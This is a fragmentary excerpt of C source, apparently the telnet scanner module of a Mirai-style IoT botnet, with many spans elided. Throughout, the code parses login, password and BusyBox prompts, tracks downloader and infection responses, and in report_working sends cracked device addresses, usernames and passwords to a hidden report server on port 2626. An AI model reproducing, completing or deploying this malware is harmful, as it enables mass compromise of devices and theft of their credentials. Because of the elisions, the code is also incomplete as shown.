...
static void report_working(ipv4_t, uint16_t, char *, char *);
                    ...
                    while (TRUE)
                    {
                        ...
                        case SC_DO_CHALLANGE:
                            if ((consumed = consume_challange_resp(conn)) > 0)
                            {
                                ...
                                util_zero(conn->challange_str, sizeof(conn->challange_str));
                                ...
                                util_zero(encryptedRandomSeed, sizeof(encryptedRandomSeed));
                        ...
                        case SC_VERIFY_CHALLANGE:
                            if ((consumed = consume_verify_resp(conn)) > 0)
                            {
                                ...
                                util_zero(rdbuf, sizeof(rdbuf));
                                util_zero(encryptedFinal, sizeof(encryptedFinal));
                                util_zero(conn->challange_str, sizeof(conn->challange_str));
...
static void report_working(ipv4_t daddr, uint16_t dport, char *username, char *password)
{
    ...
    table_unlock_val(TABLE_SCAN_REPORT);

    entries = resolv_lookup(table_retrieve_val(TABLE_SCAN_REPORT, NULL));
    if (entries == NULL)
    {
#ifdef DEBUG
    ...
    addr.sin_port = htons(2626);
    resolv_entries_free(entries);

    table_lock_val(TABLE_SCAN_REPORT);
...
static int consume_resp_prompt(struct scanner_connection *conn)
{
    ...
    if (util_memsearch(conn->rdbuf, conn->rdbuf_pos, table_retrieve_val(TABLE_SCAN_NCORRECT, NULL), 8) != -1)
    {
    ...
    table_lock_val(TABLE_SCAN_NCORRECT);
    table_unlock_val(TABLE_SCAN_BUSYBOX_RESP);
    prompt_ending = util_memsearch(conn->rdbuf, conn->rdbuf_pos, table_retrieve_val(TABLE_SCAN_BUSYBOX_RESP, NULL), 18);
    table_lock_val(TABLE_SCAN_BUSYBOX_RESP);
    if (prompt_ending == -1)
        return 0;
    else
        return prompt_ending;
...
static int consume_user_prompt(struct scanner_connection *conn)
{
    ...
    if (prompt_ending == -1)
    {
        ...
        if ((tmp = util_memsearch(conn->rdbuf, conn->rdbuf_pos, table_retrieve_val(TABLE_SCAN_OGIN, NULL), 4)) != -1)
            prompt_ending = tmp;
        else if ((tmp = util_memsearch(conn->rdbuf, conn->rdbuf_pos, table_retrieve_val(TABLE_SCAN_ENTER, NULL), 5)) != -1)
            prompt_ending = tmp;
...
static int consume_pass_prompt(struct scanner_connection *conn)
{
    ...
    if (prompt_ending == -1)
    {
        ...
        if ((tmp = util_memsearch(conn->rdbuf, conn->rdbuf_pos, table_retrieve_val(TABLE_SCAN_ASSWORD, NULL), 7)) != -1)
            prompt_ending = tmp;
...
static int consume_echo_resp(struct scanner_connection *conn)
{
    char *pch;
    int i, prompt_ending = -1;
    ...
    if (prompt_ending == -1)
    {
        ...
        table_unlock_val(TABLE_SCAN_ECHO_RESP);

        if ((tmp = util_memsearch(conn->rdbuf, conn->rdbuf_pos, table_retrieve_val(TABLE_SCAN_ECHO_RESP, NULL), 22)) != -1)
            prompt_ending = tmp;

        table_lock_val(TABLE_SCAN_ECHO_RESP);
    }
...
static int consume_downloader_resp(struct scanner_connection *conn)
{
    char *pch;
    int i, prompt_ending = -1;
    ...
    if (prompt_ending == -1)
    {
        ...
        table_unlock_val(TABLE_SCAN_SEG_FAULT);
        table_unlock_val(TABLE_SCAN_ILLEGAL);
        table_unlock_val(TABLE_SCAN_DLR_OUTPUT);

        if ((tmp = util_memsearch(conn->rdbuf, conn->rdbuf_pos, table_retrieve_val(TABLE_SCAN_SEG_FAULT, NULL), 18)) != -1)
            return -1;
        if ((tmp = util_memsearch(conn->rdbuf, conn->rdbuf_pos, table_retrieve_val(TABLE_SCAN_ILLEGAL, NULL), 19)) != -1)
            return -1;
        if ((tmp = util_memsearch(conn->rdbuf, conn->rdbuf_pos, table_retrieve_val(TABLE_SCAN_DLR_OUTPUT, NULL), 5)) != -1)
            prompt_ending = tmp;

        table_lock_val(TABLE_SCAN_SEG_FAULT);
        table_lock_val(TABLE_SCAN_ILLEGAL);
        table_lock_val(TABLE_SCAN_DLR_OUTPUT);
    }
...
static int consume_infection_resp(struct scanner_connection *conn)
{
    char *pch;
    int i, prompt_ending = -1;
    ...
    if (prompt_ending == -1)
    {
        ...
        if ((tmp = util_memsearch(conn->rdbuf, conn->rdbuf_pos, table_retrieve_val(TABLE_EXEC_SUCCESS, NULL), 9)) != -1)
            prompt_ending = tmp;
...
static int consume_challange_resp(struct scanner_connection *conn)
{
    ...
    if (prompt_ending == -1)
    {
        ...
        table_unlock_val(TABLE_SCAN_RAND_NUM);

        if ((tmp = util_memsearch(conn->rdbuf, conn->rdbuf_pos, table_retrieve_val(TABLE_SCAN_RAND_NUM, NULL), 8)) != -1)
            prompt_ending = tmp;

        table_lock_val(TABLE_SCAN_RAND_NUM);
    }
...
static int consume_verify_resp(struct scanner_connection *conn)
{
    ...
    if (prompt_ending == -1)
    {
        ...
        table_unlock_val(TABLE_SCAN_VERIFY_OK);

        if ((tmp = util_memsearch(conn->rdbuf, conn->rdbuf_pos, table_retrieve_val(TABLE_SCAN_VERIFY_OK, NULL), 9)) != -1)
            prompt_ending = tmp;

        table_lock_val(TABLE_SCAN_VERIFY_OK);
    }
...
static int consume_telnet_resp(struct scanner_connection *conn)
{
    ...
    if (prompt_ending == -1)
    {
        ...
        table_unlock_val(TABLE_SCAN_OPEN_OK);

        if ((tmp = util_memsearch(conn->rdbuf, conn->rdbuf_pos, table_retrieve_val(TABLE_SCAN_OPEN_OK, NULL), 7)) != -1)
            prompt_ending = tmp;

        table_lock_val(TABLE_SCAN_OPEN_OK);
    }
